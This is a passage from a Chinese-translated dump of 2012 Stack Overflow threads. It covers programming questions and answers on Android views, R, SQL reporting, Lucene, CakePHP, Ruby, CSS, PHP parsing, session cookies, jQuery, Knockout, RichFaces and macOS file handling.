        return false; 
    case MotionEvent.ACTION_UP:         
        switch (currentTouch) {
        case TOUCH_TOP:
            /* ----- */
            return true;
        case TOUCH_RIGHT:
            /* ----- */
            return true;
        case TOUCH_LEFT:
            /* ----- */
            return true;
        case Inner_Touch:
            /* ----- */
            invalidate();  
        return true;
        }           
        return false;
    }
    return super.onTouchEvent(event);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T06:15:40.603

您应该覆盖`onSizeChanged`or`onMeasure`方法来让您`ViewGroup`知道视图的大小。并确保您的视图的宽度和高度都是`WRAP_CONTENT`.

关于触摸事件-这里的问题是您的视图大小与父大小匹配，因此它会拦截所有触摸事件（因为它`true`在 中返回`onTouchEvent`）。

这是[一个很棒的教程](http://developer.android.com/training/custom-views/custom-drawing.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T06:16:07.750

在将其添加到视图组之前，将 OnLongClickListener 添加到 customview。

为了帮助在更高级别识别视图，您可能希望使用 setTag("id", id); 在视图上设置标识符。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-09T11:29:48.287

查看这个项目，它可能会有所帮助 => [Android 多点触控控制器](http://code.google.com/p/android-multitouch-controller/source/checkout)，一个简单的 Android 多点触控缩放库。

这是另一个[例子](http://blahti.wordpress.com/2011/01/17/moving-views-part-2/)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-06T06:21:35.597

如果我理解正确，您添加的视图太大并填充它的父级。
做类似的事情还不够吗

```
TwoPointsDraw drawView = new TwoPointsDraw(context);
FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(
                    LayoutParams.WRAP_CONTENT,
                    LayoutParams.WRAP_CONTENT);
drawView.setLayoutParams(lp)
frame.addView(drawView); 
```

# r - R中的三角函数

> ID：11782766
> 
> 赞同：0
> 
> 时间：2012-08-02T17:31:44.697
> 
> 标签：r, dataframe, trigonometry

我有一个包含一系列值 Xg 的 data.frame，我将对其应用三角函数以在 data.frame 中创建一个名为“angle”的新列：

```
dt$angle <- sin(asin(dt$Xg / 9.8))
dt$angle <- asin(dt$angle) 
```

但是，当我在这里应用第二行代码时，它并没有给我正确的值，我可以使用错误的计算器来计算。此代码是将反正弦函数单独应用于每个数据点还是我遗漏了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T18:35:45.217

我使用身份检查了我的反正弦函数`tan(asin(x))=x/sqrt(1-x^2)`

```
x=seq(.1,.9,.001)
cbind(
tan(asin(x)),
x/sqrt(1-x^2))

            [,1]      [,2]
  [1,] 0.1005038 0.1005038
  [2,] 0.1015191 0.1015191
  [3,] 0.1025348 0.1025348
  [4,] 0.1035507 0.1035507
  [5,] 0.1045670 0.1045670
  [6,] 0.1055836 0.1055836
  [7,] 0.1066006 0.1066006
  [8,] 0.1076178 0.1076178
  [9,] 0.1086354 0.1086354
 [10,] 0.1096533 0.1096533
 [11,] 0.1106716 0.1106716
         ... 
```

这对我来说看起来不错。尝试一下，看看你是否得到相同的结果。然后检查你的计算器。祝你好运

# datetime-format - Reporting Services 3.0 图表调用带有日期时间值的存储过程，如何排序？

> ID：11782771
> 
> 赞同：0
> 
> 时间：2012-08-02T17:32:11.593
> 
> 标签：datetime-format, reportbuilder3.0

我在 SQL Server 2008 中有一个存储过程。返回的值之一是：

SELECT DATEADD(mm, DATEDIFF(mm,0,e.Day), 0) AS [Month],

所以我得到如下值：2012-05-01 00:00:00.000

我想在图表报告的 X 轴上显示月份，显然是按时间顺序排序的。如果我可以将月份显示为“May-2012”或“2012 - May”，那就太好了。现在它将整个内容显示为 5/1/2012 12:00:00 AM，并且按字母顺序而不是按月份排序。

当我检查排序时，它显示字段 [Month] 并按 A 到 Z 的顺序排列，所以我认为它没有“看到”它作为日期时间值。

1.  如何正确排序？
2.  如何更改格式以将月份显示为“May-2012”？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T18:45:55.497

好的，解决方法：

我与我的 DBA 交谈，要求他从存储过程中返回一个格式化字段，其值如“2012-05”和“2012-12”，并按该字段排序。然后我在 Report builder Chart 上使用了这个新字段，并删除了所有排序。

目前有效，但仍需要了解如何正确处理未来的报告。

# fitnesse - DBfit - 比较 2 个实际和预期的表

> ID：11782772
> 
> 赞同：0
> 
> 时间：2012-08-02T17:32:13.897
> 
> 标签：fitnesse, dbfit

我正在使用 DbFit 和 FitNesse 为我们的一些报告存储过程编写测试。为了让生活更轻松，我们设计了一种通用方法，将输入数据和预期数据存储在 2 个表中，并针对每种情况将输出表与预期表进行比较。我没有这样做，因为 DbFit 只期望在页面中硬编码实际值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-09T20:14:13.450

你是对的，DbFit 比较的是 wiki 页面上的预期值，而不是另一个表中的值。要比较 2 个表中的值，需要编写一个新的夹具。

# lucene - 没有特定字段的 Lucene 查询文档

> ID：11782777
> 
> 赞同：1
> 
> 时间：2012-08-02T17:32:33.227
> 
> 标签：lucene

我`Lucene`在 android 中使用来搜索我的内容。我有两种类型的文档，一种有一个`trashed`字段是`true`or `false`。其他类型的文档没有该字段。我想退回所有有`trashed:false`或没有该`trashed`字段的文件。

我已经尝试添加`-trashed:true`到我的查询中，它返回所有正确的文档，但是它弄乱了搜索的偏移量围绕着一个不同的词，而不是我正在搜索的词。

编辑：

我必须将此添加到我执行的每个搜索查询中。我有大约 20,000 个文档的索引，我真的不想重建它，因为我让我的用户在我的上一个版本中重建了他们的索引。注意：这是在 android 设备上，因此重新索引所有文档需要很长时间和大量电池。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T07:13:56.643

我可以想到以下解决方案。

1）如果可以重建索引。

将垃圾：na 字段值添加到“垃圾”不适用的文档中。

要获取所有带有垃圾的文档：false 或“垃圾”不适用，您可以使用以下..

查询：垃圾：假或垃圾：无

2）如果你不能重建索引，我不确定......

# forms - 如何在同一个视图中处理多个表单？

> ID：11782779
> 
> 赞同：1
> 
> 时间：2012-08-02T17:32:47.677
> 
> 标签：forms, cakephp

我有一个用于我的特定视图的默认表单。

通过一个元素，我（动态地）包含另一个视图（使用视图扩展）以提供上传表单。

我的问题是第二个表格似乎提交了第一个表格。

**默认形式**

```
<div class="content-box-content">
        <?php
            echo $this->Form->create("WebSubject", array(
                'inputDefaults' => array(
                    'error' => array(
                        'attributes' => array(
                            'wrap' => 'span', 
                            'class' => 'input-notification error png_bg'
                        )                   
                    )
                )
            ));
        ?>

        <?=$this->Form->input('id', array('type' => 'hidden'))?>

        <?=$this->Form->input('title', array('class' => "text-input small-input", 'label' => 'Denumire'))?>

        <?=$this->Form->input('description', array('type' => 'textarea', 'label' => 'Descriere', 'id' => 'description'))?>

        <?=$this->Form->input('description_long', array('type' => 'textarea', 'label' => 'Continut', 'id' => 'description_long'))?>

        <?=$this->Form->submit('Salveaza', array('class' => "button"))?>
    </div> 
```

**这样我就包含了元素**

```
<div class="tab-content default-tab" id="fotoUploadTab">
            <?php
                echo $this->element('file_upload_form', array(
                        'view' => 'upload_admin',
                        'webFileType' => 'image',
                        'redirect' => $SHT['here']
                    )
                );
            ?>
            <div class="tab-content default-tab">
                Lista imagini
            </div>
        </div> 
```

**元素代码**

```
<?php
    $view = (isset($view)) ? $view : "upload_admin";
    $webFileType = (isset($webFileType)) ? $webFileType : "image";
    $redirect = (isset($redirect)) ? $redirect : "/";
?>
<?php 
    $this->extend("/WebFiles/".$view);   
?> 
```

**扩展视图代码**

```
<div class="tab-content default-tab">

    <?php echo $this->Form->create("WebFile", array('action' => '/', 'type' => 'file')); ?>

    <input type="hidden" name="redirect" value="" />
    <?php echo $this->Form->input('entity_id', array('type' => 'hidden')); ?>
    <?php echo $this->Form->input('entity_table_name', array('type' => 'hidden')); ?>
    <?php echo $this->Form->input('type', array('type' => 'hidden')); ?>

    <?php echo $this->Form->input('title', array('class' => "text-input small-input", 'label' => 'Denumire')); ?>   
    <?php echo $this->Form->input('description', array('class' => "text-input small-input", 'label' => 'Descriere')); ?>
    <?php echo $this->Form->submit('Upload', array('class' => 'button')); ?>

</div> 
```

正如在最后一个片段中看到的，我试图通过提供一个动作 url 来强制使用最后一个表单，但是在提交它时，它会像第一个那样发送数据。

我应该如何处理？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:50:20.093

如果您只想同时拥有这两种表单，则一个来自父视图/元素，另一个来自子视图/元素，请确保您在两个模板中调用 $this->Form->end() 并且您没有在另一个中嵌套表单. 在您的情况下，可能只需将 end() 添加到两种形式即可解决您的问题。

作为旁注，您不能让父视图使用 $this->Form->create() 打开表单并使用子视图将字段注入其中，主要是因为您需要在呈现任何输入之前调用 create()父视图在子视图执行后呈现。

# ruby - 如何以两位精度显示输出

> ID：11782781
> 
> 赞同：11
> 
> 时间：2012-08-02T17:32:51.657
> 
> 标签：ruby

这是我的代码

```
class Atm

  attr_accessor :amount, :rem, :balance

  TAX = 0.50

  def transaction

    @rem = @balance=2000.00
    @amount = gets.chomp.to_f

    if @amount%5 != 0 || @balance < @amount
      "Incorrect Withdrawal Amount(not multiple of 5) or you don't have enough balance"
    else
      @rem = @balance-(@amount+TAX)
      "Successful Transaction"
    end
  end
end

a=Atm.new
puts "Enter amount for transaction"
puts a.transaction
puts "Your balance is #{a.rem.to_f}" 
```

我的输出是

```
Enter amount for transaction
100                              # user enters this value
Successful Transaction
Your balance is 1899.5 
```

如您所见，“您的余额为 1899.5”仅显示一位精度。我需要帮助来理解和解决问题。我想要输出中有两位数的精度。

还有我该如何改进这段代码？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-08-02T17:41:27.740

你可以使用这个：

```
puts "Your balance is #{'%.02f' % a.rem}" 
```

但请记住，如果您的小数位超过 2 位，此代码将对您的结果进行四舍五入。例如：199.789 将变为 199.79。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-02T20:08:05.960

将钱存储为浮点数是一个基本的设计缺陷，因为浮点数是不精确的。货币应始终以最小货币单位的整数形式存储。

想象一下两个账户都有 1.005。将它们都显示出来，世界上突然多了一分钱。

而是将金额存储在整数中。例如，1 美元是`balance = 100`或 100 便士。然后格式化显示的值：

```
money = 1000
"%.2f" % (money / 100.0)
# => 10.00 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-08-02T17:41:15.480

```
number_with_precision(value, :precision => 2) 
```

应该在 Rails 中工作

# java - KeywordAnalyzer 和 LowerCaseFilter/LowerCaseTokenizer

> ID：11782783
> 
> 赞同：5
> 
> 时间：2012-08-02T17:33:00.407
> 
> 标签：java, lucene, customization, analyzer

我想构建我自己的同时使用过滤器/标记器的分析器。

我的意思是，相同的字段是*关键字*（整个流作为单个标记）和小写

如果仅使用[KeywordAnalyzer](http://lucene.apache.org/core/3_6_0/api/all/org/apache/lucene/analysis/KeywordAnalyzer.html)，则字段的值不区分大小写。如果我使用[LowerCaseTokenizer](http://lucene.apache.org/core/3_6_0/api/all/org/apache/lucene/analysis/LowerCaseTokenizer.html)或[LowerCaseFilter](http://lucene.apache.org/core/3_6_0/api/all/org/apache/lucene/analysis/LowerCaseFilter.html)，我必须将它们与执行相同[操作 KeywordAnalyzer](http://lucene.apache.org/core/3_6_0/api/all/org/apache/lucene/analysis/KeywordAnalyzer.html)的其他分析器结合起来（不使用字母、空格、删除停用词等）

**问题是**：有什么方法可以将该字段设为关键字（将整个流作为单个标记）并使用过滤器或分析器 Lucene 或标记器将该字段设为*小写？*

（谷歌翻译，错误见谅）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-03T08:58:39.423

这应该有效：

```
public final class YourAnalyzer extends ReusableAnalyzerBase { 

  @Override
  protected TokenStreamComponents createComponents(final String fieldName, final Reader reader) {
    final TokenStream source = new KeywordTokenizer(reader);
    return new TokenStreamComponents(source, new LowercaseFilter(Version.LUCENE_36, source));
  }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-06-13T08:41:54.000

在 Lucene 3.6.2 中，它必须如下所示：

```
import org.apache.lucene.analysis.KeywordAnalyzer;
import org.apache.lucene.analysis.KeywordTokenizer;
import org.apache.lucene.analysis.LowerCaseFilter;
import org.apache.lucene.analysis.LowerCaseTokenizer;
import org.apache.lucene.analysis.ReusableAnalyzerBase;
import org.apache.lucene.analysis.Tokenizer;
import org.apache.lucene.util.Version;

public class YourAnalyzer extends ReusableAnalyzerBase {

    private final Version version;

    public YourAnalyzer(final Version version) {
        super();
        this.version = version;
    }

    @Override
    protected TokenStreamComponents createComponents(final String fieldName, final Reader reader) {
        final Tokenizer source = new KeywordTokenizer(reader);
        return new TokenStreamComponents(source, new LowerCaseFilter(this.version, source));
    }

} 
```

# css - IE中的图片下方不显示文字

> ID：11782787
> 
> 赞同：0
> 
> 时间：2012-08-02T17:33:05.130
> 
> 标签：css, image, internet-explorer, text

[在这里提琴](http://jsfiddle.net/xWPyH/)

我的问题是，为什么标题文本没有显示在 IE（8 和更早版本）的缩略图下。在所有其他浏览器中都能正常工作。

HTML：

```
<div id="thumbsGrid">
    <div class= "thumbs">
        <a href="http://youtu.be/A30XhK8Vtmg">
            <img src="http://www.jillmedinger.com/NCPIE/images/thumbs/shadowed/recoverythumb.png"id="1.thumb"/>
        </a> 
        <h4><a href="http://youtu.be/A30XhK8Vtmg">Ben</a></h4>
    </div>
    <div class= "thumbs">
        <img src="http://www.jillmedinger.com/NCPIE/images/thumbs/shadowed/recoverythumb.png" id="2.thumb"/> 
        <h4><a href="/NCPIE/resonator.html"> The Resonator</a></h4>
    </div>
    <div class= "thumbs">
        <a href="/NCPIE/re.html">
            <img src="images/thumbs/door2/friendsThumbs.png"id="3.thumb"/>
        </a> 
        <h4><a href="/NCPIE/re.html">RE-Covery</a></h4>
    </div>
    <div class= "thumbs">
        <a href="/NCPIE/divedeeper2.html">
            <img src="images/thumbs/door2/divedeeper2Thumb.png"id="5.thumb"/>
        </a>  
        <h4><a href="/NCPIE/divedeeper2.html"> Dive Deeper </a></h4>
    </div>
    <!--thumbsGrid close-->     
</div> 
```

CSS：

```
.thumbs {
    float:left;
    width:100px; 
    height:100px;
    margin-right:12px;
    margin-bottom:0;
    border:0;
    padding:0;
}
#thumbsGrid {
    float:left;
    width:500px;
    min-height:216px;
    margin-left:110px;
    border:0;
    padding-right:40px;
    background: black;
}
.thumbs h4 a {
    color: #FFF;
} 
```

这里是现场直播：www.jillmedinger.com/NCPIE/door2.html

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:49:03.403

它`filter`与`.thumbs`. 最简单的解决方案是设置`position: relative`为`h4`as [this fiddle shows](http://jsfiddle.net/xWPyH/1/)。

# php - 如何在 id 为第一个属性后跟多个属性的 div 标签之间获取文本。仅使用正则表达式

> ID：11782792
> 
> 赞同：0
> 
> 时间：2012-08-02T17:33:15.913
> 
> 标签：php, html, regex

> **可能重复：**
> [如何在 id 为第一个属性的 div 标签之间获取文本。仅使用正则表达式。](https://stackoverflow.com/questions/11780553/how-to-get-text-between-div-tags-with-id-being-1st-attribute-only-with-regular)

这是场景

我正在使用这个正则表达式来获取带有 id test1、tes2 或 test3 的 div 标签内的文本

```
<div id = "test1">text</div>
<div id = "test2">text</div>
<div id = "test3">text</div>

$id_value = "test1" or "test2" or "test3";
$regex = "#\<div id=\"".$id_value."\"\>(.+?)\<\/div\>#s"; 
```

我唯一的要求是在下面的场景中从 div 标签中获取文本

```
<div id="test" class="testing" style="color:red" etc etc .... more attributes >text</div> 
```

即 id 是 div 标签的第一个属性，后面可以跟 n 个属性。如何仅通过正则表达式从此类标签中提取文本。

我什至试过

```
$regex = '#<div\s+.*?id="".$id_value."".*?>(.*?)</\s*div>#ims'; 
```

它在 $id_value = "test1" 时返回 div 标签的文本，但如果 $id_value="test2" 它返回节点 test1 和 test2 的文本值。如果 $id_value="test3" 它返回所有 3 个节点的文本值。我只需要与特定 id 相关的文本值。**仅使用正则表达式。**

请帮忙谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T17:35:40.453

不要使用 RegExp 解析 HTML。相反，请使用 PHP 的**[DOM 扩展](http://php.net/dom)**，它可以正确解析任何类型的 HTML。

例子：

```
<?php

    $html = <<<HTML
<div id = "test1">text</div>
<div id = "test2">other text</div>
<div id = "test3">new text</div>
HTML;

    $id_list = array(
        "test1",
        "test2",
        "test3",
    );

    $doc = new DOMDocument();
    $doc->loadHTML($html);
    foreach ($id_list as $id) {
        $div = $doc->getElementById($id);
        if ($div == NULL) {
            echo "There's no element with an ID of $id<br>\n";
        }
        else {
            echo "$id's content is: " . $div->textContent . "<br>\n";
        }
    } 
```

当且仅当您绝对必须使用 RegExp，这就是我想出的：

```
<?php

    $html = <<<HTML
<div id = "test1">text</div>
<div id = "test2">other text</div>
<div id = "test3">new text</div>
HTML;

    $id_list = array(
        "test1",
        "test2",
        "test3",
    );

    foreach ($id_list as $id) {
        $pattern = <<<REGEX
/
<div\s*                     #Opening Tag
(?:                         #Attributes before ID
    [a-z]+                  #Attribute name
    \s*=\s*                 #Equals
    (?:"[^"]*"|'[^']*')     #Attribute content
    \s*                     #Spaces?
)*                          #Many or none
(?:                         #ID Attribute
    id
    \s*=\s*
    (?:"$id"|'$id')         #Matches the ID
    \s*
)
[^>]*                       #Anything after ID
>                           #Closing Tag
([^<]*)                     #Actual content!
<\/div>
/xi
REGEX;

        preg_match_all($pattern, $html, $matches);
        var_dump($matches);
    } 
```

请注意，如果您使用此代码，unh̶oly͘͘c̀h̶i͏l҉d 会哭出处女的血。`<cent`er> 不能坚持已经太晚了。

# javascript - 从客户端删除任何会话

> ID：11782793
> 
> 赞同：5
> 
> 时间：2012-08-02T17:33:19.797
> 
> 标签：javascript, session, cookies, client-side, httponly

我正在准备一些诊断工具。它在 iframe 中的网站上运行 - 仅通过 javascript。

现在我需要的是摆脱我在 iframe 中的网站中的会话 cookie。我只需要在执行一些操作后退出。

不幸的是，我不能只从 javascript 中删除会话 cookie，因为它带有 httpOnly 标志。我也没有找到以隐身模式打开 iframe 的任何方法。

现在实现这一点的规则如下：

*   我可以将任何文件添加到目标网站服务器
*   我可以在网站域上运行任何 javascript
*   我可以强制用户使用指定的浏览器（它不必是跨浏览器的解决方案）
*   我不能修改网站代码
*   解决方案必须独立于服务器和编程语言

任何解决方法的想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-09T09:37:26.570

您只是无法从 javascript 管理 httpOnly cookie。

但是我觉得你要分析页面，还要用js。那么为什么要使用 iframe 呢？

您可以从 html 或 javascript 之外获取要分析的页面内容：

*   向您的应用程序代理发出 ajax 请求
*   使用 html5 websockets 作为代理服务器。我假设 websocket 服务器是你的。Websockets 还具有跨域能力。

然后你只需要解析获取的 DOM（我看到了一些内置的东西）。让分析开始。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-09T15:33:00.440

据我所理解 -

鉴于此 - 您将拥有一个网站，其中实现了用户登录/注销。

因此，如果您可以通过某种方式让您的诊断应用程序将目标网站的**注销 url**作为配置变量或某些设置（通过在服务器中放置一些 js 或文件），那么这项工作可能非常简单。只需让您的诊断应用程序在需要时加载该注销 url。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T18:23:48.253

如果您只是想阻止在 iframe 中使用 cookie，您可以尝试使用沙箱属性。

似乎是一个非常相似的问题：

[禁用框架/iframe 中的 Cookie](https://stackoverflow.com/questions/3330906/disable-cookies-inside-a-frame-iframe)

希望我正确理解您的问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T16:27:32.763

您*有*JavaScript，因此只需向您的服务器发出 AJAX 请求并告诉它取消设置会话变量。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-04T17:12:31.027

说 IFrame 引用 url：example.com/iframe.html。

让它改为引用 cookieless.example.com/iframe.html，并有一个服务器端反向代理规则设置来获取该请求并将其指向 example.com/iframe.html。

根据您设置 cookie 服务器端（即：'.example.com'）的方式，cookie 将仅在 www 和 root-domain 上设置

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-08T14:48:38.933

我认为您将需要某种服务器端代理来记录 cookie 标头值，然后根据请求中的值在稍后阶段重置此标头值。

这应该不会太难用任何语言编写，例如在 IIS / .net 框架上，它将是 IHttpModule 的实现。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-08-11T06:06:36.977

唯一的方法是禁用 Cookie

# php - 带有ajax响应的jqueryui自动完成

> ID：11782797
> 
> 赞同：1
> 
> 时间：2012-08-02T17:33:32.957
> 
> 标签：php, ajax, autocomplete

我试图在 ajax 中获得对 JqueryUi 自动完成的响应，但我无法在下拉框中得到结果。这是脚本=>

```
$(function(){
    $("#user_key" ).autocomplete({
        source: function(){
            var http = false;
            if (window.XMLHttpRequest){
                http = new XMLHttpRequest();
            } else {
                http = new ActiveXObject("Microsoft.XMLHTTP");
            }
            if (http){
                http.open("POST","./ajax/autocomplete.php",true);
                http.onreadystatechange = function(){
                    if (http.status==200 && http.readyState==4){
                        this.value = http.responseText;
                    }
                };
                http.send(null);
            }
        },
        close: function(){

        }
    });
}); 
```

为了简化示例，`autocomplete.php`仅写`<?php echo "hello"; ?>` 了如何在下拉框中获取此“你好”以及为什么需要在脚本底部使用**close:函数，谢谢 :)**

PS。我认为我在编写**this.value = http.responseText**时出错了，例如在编写 alert(http.responseText) 时，它会从 .php 文件中获取结果。如何指示结果写在下拉框中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T18:09:26.227

根据文档和我所做的一些测试，您只需要`source`使用 php 脚本的 url 设置属性。

jQuery UI 代码将`term`查询字符串中的参数发送到您在此处指定的 url：`source.php?term=hello`

因此，在您的示例中，假设您在 PHP 脚本中正确处理了 querystring 参数，那么以下应该可以工作，该脚本应该返回一个 JSON 数组。

```
$(function(){
    $("#user_key" ).autocomplete({
        source: "./ajax/autocomplete.php",
        minLength: 2
    });
}); 
```

返回的 JSON 数据应具有以下格式：

```
[{ "id" : "Item1", "label" : "Item1", "value" : "Item1" }, 
{ "id": "Item2", "label" : "Item2", "value" : "Item2" }] 
```

# javascript - onclick 滚动事件 - 语法？

> ID：11782798
> 
> 赞同：5
> 
> 时间：2012-08-02T17:33:34.900
> 
> 标签：javascript, jquery, syntax

试图让它滚动基于它是在页面的左侧还是右侧单击。似乎不起作用..也许我的语法不正确或者我用来查找页面左侧或右侧的方法是？

与`<body onclick="scrollevent()">`：

```
 <script>
 function scrollevent()
 { 
    var y=0;
    var pwidth = $('#slideshow').width();
    var mouseY = ev.clientY;

    if (mouseY<(pwidth/2) {
        $('#slideshow').animate({scrollLeft: "+=400"});
     }
     else{
        $('#slideshow').animate({scrollLeft: "-=400"});
    }
 }
 </script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:48:11.077

您可以使用`pageX`而不是对象的*pageY*属性`event`，请尝试以下操作：

> 鼠标相对于文档左边缘的位置。

```
$(document).click(function(e){  // or $(document).on('mousemove', function(e){
   var mp = e.pageX;
   var w = $(window).width() / 2;
   if (mp < w) {
        $('#slideshow').animate({scrollLeft: "+=400"});
   } else {
        $('#slideshow').animate({scrollLeft: "-=400"});
   } 
}) 
```

请注意，您的代码中存在语法错误，您错过了`)`：

```
if (mouseY<(pwidth/2) { 
```

应该：

```
if ( mouseY < (pwidth/2) ) { 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:47:02.627

> .animate() 方法允许我们在任何数字**CSS 属性**上创建动画效果。

[http://api.jquery.com/animate/](http://api.jquery.com/animate/)

.scrollLeft() 是一个 jQuery 函数，而不是 css 属性。

**upd：**我的错，正如文档所说：

> 除了样式属性，一些非样式属性如scrollTop和scrollLeft，以及自定义属性，都可以动画化。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:44:43.140

您正在使用 clientY。

使用 clientX 而不是 clientY 来检查它是在页面左侧还是右侧被点击。

演示可以在这里找到：http: [//jsfiddle.net/codebombs/UT9xK/](http://jsfiddle.net/codebombs/UT9xK/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T17:50:53.900

该行：

```
if (mouseY<(pwidth/2) { 
```

缺少一个结束`)`。尝试这个：

```
if (mouseY<(pwidth/2)) { 
```

# javascript - Knockoutjs 在父母的可观察变化时更新孩子

> ID：11782800
> 
> 赞同：3
> 
> 时间：2012-08-02T17:33:37.333
> 
> 标签：javascript, mvvm, knockout.js

当父可观察对象使用 KnockoutJs 发生更改时，如何触发对子元素的更新？

在我的应用程序中，我正在构建一个翻译工具。我有一个表示某些文本的原始（默认）值的淘汰赛类，其中包含一组已翻译的子项：

```
function ParentObject(id, defaultValue) {
    var self = this;

    self.id = id;
    self.defaultValue = ko.observable(defaultValue);

    self.children = ko.observableArray();

    self.loadChildren = function () {
       // standard code to load the children ("lazy load", as I have gobs of data)
    }
} 
```

而孩子是

```
function Child(id, translation, cultureCode) {
    var self = this;

    self.id = id;
    self.cultureCode = cultureCode;
    self.translation= ko.observable(translation);
} 
```

父项的 defaultValue 属性绑定到输入控件。

我想要做的是在我更新父母的默认值时为每个孩子调用我的翻译服务。但是我对如何进行有点迷茫。

1.  如何识别父级的“defaultValue”属性已更改？
2.  发生这种情况时，我应该迭代父级中的子级，还是以某种方式也将其移至子级？

（注意，我的例子是从实际实现中简化的）

**编辑：**将此与函数一起添加到我的 defaultValue 元素中，仍然传递旧值：

```
 data-bind=" value: defaultValue, event: {change: updateChildren}" 
```

其中 updateChildren 迭代子数组。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T18:36:31.757

如果您在孩子上引用父母，您应该可以做类似的事情。

```
parent.defaultValue.subscribe(function(newValue){
    //do something on child with newValue
}); 
```

总体思路在“扩展器” [http://knockoutjs.com/documentation/extenders.html中进行了解释](http://knockoutjs.com/documentation/extenders.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T18:45:36.717

这是一个工作示例： [JsFiddle](http://jsfiddle.net/gurkavcu/Ft87W/)

```
function ParentObject(id, defaultValue) {
    var self = this;

    self.id = id;

    self.defaultValue = ko.observable(defaultValue);

    self.defaultValue.subscribe(function(newValue){
        ko.utils.arrayForEach(self.children(), function(child) {
           alert(child.id);
        });
        console.log(newValue);
    });

    self.children = ko.observableArray();

    self.loadChildren = function () {
       // standard code to load the children ("lazy load", as I have gobs of data)
    }
}

function Child(id, translation, cultureCode) {
    var self = this;

    self.id = id;
    self.cultureCode = cultureCode;
    self.translation= ko.observable(translation);
}

var vm = function() {
    var self = this;
    self.parent = new ParentObject(1,10);
    self.parent.children.push(new Child(1,"A","1A"));
    self.parent.children.push(new Child(2,"B","2B"));
    self.parent.children.push(new Child(3,"C","3C"));
}

var viewModel = new vm();

ko.applyBindings(viewModel); 
```

​ 您可以使用订阅功能来监听可观察到的变化：

```
 self.defaultValue.subscribe(function(newValue){
        ko.utils.arrayForEach(self.children(), function(child) {
           alert(child.id);
        });
        console.log(newValue);
    }); 
```

# richfaces - 表单提交行为

> ID：11782804
> 
> 赞同：2
> 
> 时间：2012-08-02T17:33:59.830
> 
> 标签：richfaces, jsf-1.2, ajax4jsf, richfaces-modal

我想了解 Richfaces 上 a4j 背后的行为。

我有 ah:form 和 ah:inputText 和 a4j:commandButton。按钮操作调用我的 bean 中的一个方法，并且 oncomplete 显示 Richfaces.showModal 和一些内容。

```
<h:form id="i_form">
    <h:inputText value="#{ordemManagedBean.formEntity.emissor.cpf}" required="true" />
    <a4j:commandButton value="#{msg.labelbtn}" reRender="f_FormordemEmissorModal" oncomplete="Richfaces.showModalPanel('ordemEmissorModal');" action="#{ordemManagedBean.consultarCadastroEmissor}" />
</h:form> 
```

在 h:form 之外，我有一个 ui:decorate 可以导入我的 Modal，它周围有一个表单。

```
<ui:decorate template="/templates/ordemEmissorModal.xhtml">
        <ui:param
            name="beanForm"
            value="#{ordemManagedBean}"
/> 
```

问题：当我点击按钮提交表单时，该方法被触发并显示模式，但它只在第一次工作。当我关闭我的模态，更改输入值并提交时，不会调用该方法，并且我的模态显示为旧内容。我的第二个表单提交中发生了什么？

先感谢您！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-10T00:29:43.943

要检查验证错误，您可以使用`<h:message>`or`<h:messages>`并在属性上提供`id`您的 并在触发请求时重新渲染 ，并且由于您使用的是richfaces 还有or ，因此功能相同，但后者具有更多附加功能.`<h:inputText>``for``<h:message>``<rich:message>``<rich:messages>`

```
<h:form id="i_form">
    <h:inputText id="input" value="#{ordemManagedBean.formEntity.emissor.cpf}" required="true" />
     <rich:message for="input" id="error" />
    <a4j:commandButton value="#{msg.labelbtn}" reRender="f_FormordemEmissorModal, error" oncomplete="Richfaces.showModalPanel('ordemEmissorModal');" action="#{ordemManagedBean.consultarCadastroEmissor}" />
</h:form> 
```

你也可以检查这个线程。[Jsf 验证](https://stackoverflow.com/questions/6775887/check-for-validation-errors-in-part-of-a-form-in-jsf)

# objective-c - OSX 中的事务文件操作

> ID：11782806
> 
> 赞同：5
> 
> 时间：2012-08-02T17:34:02.147
> 
> 标签：objective-c, macos, cocoa, filesystems

我正在尝试执行以下操作：

*   读取文件的属性
*   如果属性匹配某个条件，则删除文件

现在我`NSFileManager`用来执行 a`attributesOfItemAtPath:error:`后跟`removeItemAtPath:error:`. 我担心这两个操作之间会发生一些使初始检查无效的事情。

使这两个操作原子化的最佳方法是什么？

**编辑**

